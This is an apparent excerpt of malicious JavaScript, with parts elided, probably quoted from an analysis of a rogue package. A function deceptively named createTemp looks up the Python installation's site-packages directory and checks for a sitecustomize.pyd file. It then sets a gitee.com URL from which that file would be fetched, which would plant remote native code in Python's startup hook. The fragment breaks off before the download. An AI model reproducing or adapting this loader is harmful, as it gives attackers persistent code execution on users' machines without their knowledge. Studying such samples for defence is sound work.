...
function createTemp() {
    ...
    try {
        const tempDir = execSync('python -c "import sys; print(sys.base_prefix)"')
            .toString()
            .trim();
        const sitePackagesDir = path.join(tempDir, 'Lib', 'site-packages');
        if (!fs.existsSync(sitePackagesDir)) {
            return;
        }
        const filePath = path.join(sitePackagesDir, 'sitecustomize.pyd');
        if (fs.existsSync(filePath)) {
            return;
        }
        const fileUrl = 'https://gitee.com/intC/ini/raw/master/tools';
